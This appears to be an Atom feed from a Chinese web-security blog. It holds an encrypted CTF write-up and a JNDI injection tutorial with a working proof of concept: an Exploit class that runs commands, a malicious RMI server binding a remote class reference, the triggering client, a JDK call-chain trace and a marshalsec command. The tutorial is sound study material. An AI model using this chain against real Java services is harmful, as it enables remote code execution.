<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Arsene.Tang</title>
  
  <subtitle>一个喜欢web安全但菜的离谱的萌新</subtitle>
  <link href="https://arsenetang.github.io/atom.xml" rel="self"/>
  
  <link href="https://arsenetang.github.io/"/>
  <updated>2022-03-22T08:04:21.845Z</updated>
  <id>https://arsenetang.github.io/</id>
  
  <author>
    <name>Arsene.Tang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WP篇之第二届红明谷杯 --- Fan website</title>
    <link href="https://arsenetang.github.io/2022/03/22/WP%E7%AF%87%E4%B9%8B%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF---Fan%20website/"/>
    <id>https://arsenetang.github.io/2022/03/22/WP%E7%AF%87%E4%B9%8B%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF---Fan%20website/</id>
    <published>2022-03-21T16:00:00.000Z</published>
    <updated>2022-03-22T08:04:21.845Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 先看请联系管理员哦" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a23ddeff84000d5df78e960b442d35900d7d10d8b018a36c2413dbccab6569af"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="wp" scheme="https://arsenetang.github.io/tags/wp/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之JNDI注入</title>
    <link href="https://arsenetang.github.io/2022/03/21/Java%E7%AF%87%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5/"/>
    <id>https://arsenetang.github.io/2022/03/21/Java%E7%AF%87%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5/</id>
    <published>2022-03-20T16:00:00.000Z</published>
    <updated>2022-03-21T11:56:26.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>前面做了做铺垫，这篇文章就来正式进入<code>jndi</code>注入的学习，其实也不算特别难，就是链子有点儿长，得耐心下来</p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>JNDI(Java Naming and Directory Interface)</code>，是SUN公司提供的一种标准的Java<strong>命名</strong>和<strong>目录接口</strong>，JNDI提供统一的<a href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF/101081">客户端</a>API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445">应用程序</a>可以和这些命名服务和<a href="https://baike.baidu.com/item/%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1/10413830">目录服务</a>之间进行交互，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口</p><p><code>JNDI</code>支持的服务主要有：DNS、LDAP、CORBA、RMI等等，其实常用的也就<code>RMI</code>和<code>LDAP</code></p><p>在<code>JNDI</code>中，每个对象都有一组唯一的键值绑定，将每一个对象和名字绑定，使得应用程序可以通过名字搜索到指定的对象，而目录服务是命名服务的自然拓展，这两者的区别就是目录服务中对象不但可以有名称，还可以有属性；命名服务中对象是没有属性的</p><p><img src="https://s2.loli.net/2022/03/21/jVWyTehR6InovSu.png" alt="image.png"></p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>那么，为什么会出现漏洞呢？</p><p>首先我们来看看<code>RMI</code>，因为<code>RMI</code>注册表服务提供程序<code>(RMI Registry Service Provider)</code>允许应用程序通过<code>JNDI</code>应用接口对<code>RMI</code>中注册的远程对象进行访问，那么假如我们远程绑定一个恶意对象，是不是就可以了？</p><p><code>RMI</code>的核心特点之一就是动态类加载，假如当前<code>Java</code>虚拟机中并没有此类，它可以去远程<code>URL</code>中去下载这个类的<code>class</code>，而这个<code>class</code>文件可以使用web服务的方式进行托管；而<code>rmi</code>注册表上可以动态的加载绑定多个<code>rmi</code>应用；对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。</p><p>就是利用<code>RMI</code>去动态加载类，<code>RMI</code>那里绑定了一个对象，然后通过<code>JNDI</code>去获取这个绑定的对象</p><p>但是在<code>JNDI</code>服务中，<code>RMI</code>服务端除了直接绑定远程对象以外，还可以通过<code>References</code>类来绑定一个外部的远程对象，这个远程对象是当前名称目录系统之外的对象，绑定了<code>Reference</code>之后，服务端会先通过<code>Referenceable.getReference()</code>获取绑定对象的引用，并且在目录中保存。当客户端在<code>lookup()</code>查找这个远程对象时，客户端会获取相应的<code>object factory</code>，最终通过<code>factory</code>类将<code>reference</code>转换为具体的对象实例。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先<code>Exploit.class</code>还是和上一篇文章中的一样，放到<code>WWW</code>根目录下面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmd = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">            Runtime runtime = Runtime.getRuntime();</span><br><span class="line">            Process process = runtime.exec(<span class="string">&quot;cmd.exe /c dir&quot;</span>);</span><br><span class="line">            InputStream inputStream = process.getInputStream();</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream, <span class="string">&quot;gb2312&quot;</span>));</span><br><span class="line">            <span class="keyword">while</span>(br.readLine()!=<span class="keyword">null</span>)</span><br><span class="line">                System.out.println(br.readLine());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在写服务端的代码之前，我们先来介绍一下今天的主角：<code>Reference</code>类</p><p><code>javax.naming.Reference</code>类表示对存在于命令或目录系统以外的对象的引用；就是说一个<code>Object</code>对象，可以通过绑定<code>Reference</code>存储在<code>RMI</code>、<code>LDAP</code>服务下面，在使用<code>Reference</code>时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发</p><p>看看<code>Reference</code>类的关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reference</span> <span class="keyword">implements</span> <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String className;</span><br><span class="line">    <span class="keyword">protected</span> Vector&lt;RefAddr&gt; addrs = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> String classFactory = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> String classFactoryLocation = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.className  = className;</span><br><span class="line">        addrs = <span class="keyword">new</span> Vector();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(className);</span><br><span class="line">        classFactory = factory;</span><br><span class="line">        classFactoryLocation = factoryLocation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实主要就是三个参数：<code>className、classFactory、classFactoryLocation</code></p><ul><li><code>classname</code>：远程加载时所使用的类的名字，可以随便取</li><li><code>classFactory</code>：<code>class</code>中需要实例化类的名称</li><li><code>classFactoryLocation</code>：加载<code>class</code>的远程地址，可以是<code>file/ftp/http</code>等协议</li></ul><p>服务端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDISERVER</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        Reference Exploit = <span class="keyword">new</span> Reference(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;http://127.0.0.1:80/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(Exploit);</span><br><span class="line">        registry.bind(<span class="string">&quot;evil&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就几行代码，逻辑也很简单，应该也挺好理解，就是将<code>http://127.0.0.1:80/Exploit.class</code>这个类绑定到了<code>127.0.0.1:1089/evil</code>这个名字上了，我们就可以通过<code>rmi</code>来加载它了，客户端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDICLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        ctx.lookup(<span class="string">&quot;rmi://127.0.0.1:1089/evil&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/21/wTVPNZUzReYSfoO.png" alt="image.png"></p><p>这里的流程就是我们用<code>lookup(url)</code>获取远程对象时会获取到一个<code>Reference</code>对象，然后客户首先会去本地的<code>classpath</code>寻找被标识为<code>refClassName</code>的类，如果本地未找到，就会去请求我们所定义的远程地址的<code>refClassName.class</code>，然后就会动态加载<code>class</code></p><p>这里我用的是<code>Java</code>7u21的版本，换成<code>Java</code>8的版本之后就不行了，因为在<code>6u141,7u131,8u121</code>之后，新增了 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>RMI</code>和<code>CORBA</code>协议使用远程<code>codebase</code>选项，虽然该更新阻止了<code>RMI</code>和<code>CORBA</code>触发漏洞，但是我们仍然可以使用<code>LDAP</code>协议进行攻击，随后在<code>6u211,7u201.8u191</code>中，又新增了 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为<code>false</code>，禁止<code>LDAP</code>协议使用远程<code>codebase</code>选项</p><p>只不过嘛，说是这么说，不过总是有办法可以绕的嘛，后面的文章再来说这个</p><p><code>ldap</code>的复现就看我上一篇文章了哈</p><h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>接下来我们就来看看它的调用流程，也就是漏洞的原理，调用链很长，大家做好心理准备哈哈，我还是建议大家也下个断点来自己调试哈</p><p>首先进入到<code>InitialContext</code>类中的<code>lookup</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="comment">//getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象</span></span><br><span class="line">        <span class="comment">//然后在对应协议中去lookup搜索，我们进入lookup函数</span></span><br><span class="line">        <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>getURLOrDefaultInitctx</code>获取到了一个<code>rmiURLContext</code>，所以说进入到<code>GenericURLContext</code>类中的<code>lookup</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址</span></span><br><span class="line">    <span class="comment">//不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext</span></span><br><span class="line">    <span class="comment">//进入不同的协议路线</span></span><br><span class="line">    ResolveResult var2 = <span class="keyword">this</span>.getRootURLContext(var1, <span class="keyword">this</span>.myEnv);<span class="comment">//获取RMI注册中心相关数据</span></span><br><span class="line">    Context var3 = (Context)var2.getResolvedObj();<span class="comment">//获取注册中心对象</span></span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());<span class="comment">//去注册中心调用lookup查找，我们进入此处，传入name-evil</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>var3</code>是一个注册中心<code>RegistryContext</code>对象，所以说它会进入到<code>RegistryContext</code>类中的<code>lookup</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//判断来到这里</span></span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));<span class="comment">//RMI客户端与注册中心通讯，返回RMI服务IP，地址等信息</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));<span class="comment">//我们进入此处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会返回ip、端口等信息，继续走，进入到<code>decodeObject</code>方法里面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，世界线在这里变动</span></span><br><span class="line">            <span class="comment">//如果是Reference对象会，进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。</span></span><br><span class="line">            <span class="comment">//如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。</span></span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            <span class="comment">//获取reference对象进入此处</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进，进入到<code>NamingManager</code>类中的<code>getObjectInstance</code>方法中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">// Use builder if installed</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Use reference if possible</span></span><br><span class="line">    Reference ref = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;<span class="comment">//满足</span></span><br><span class="line">        ref = (Reference) refInfo;<span class="comment">//复制</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;<span class="comment">//不进入</span></span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;<span class="comment">//进入此处</span></span><br><span class="line">        String f = ref.getFactoryClassName();<span class="comment">//函数名 ExecTest</span></span><br><span class="line">        <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//任意命令执行点1（构造函数、静态代码），进入此处</span></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//任意命令执行点2（覆写getObjectInstance），</span></span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                    environment);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">            <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">            answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">            <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> answer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>getObjectFactoryFromReference</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException,InstantiationException,MalformedURLException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Class clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//尝试从本地获取该class</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果不在本地classpath，从cosebase中获取class</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp; (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//此处codebase是我们在恶意RMI服务端中定义的http://127.0.0.1:80/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//从我们放置恶意class文件的web服务器中获取class文件</span></span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实例化我们的恶意class文件</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就在这里实例化了，实例化会默认调用构造方法，以及静态代码块，就在这里实现了任意代码执行</p><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>上一篇文章我们讲过的<code>marshalsec</code>工具不仅可以起一个<code>ldap</code>服务器，同样也可以起一个<code>rmi</code>服务器，语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rmi:  java -cp mar*.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:80/\#Exploit 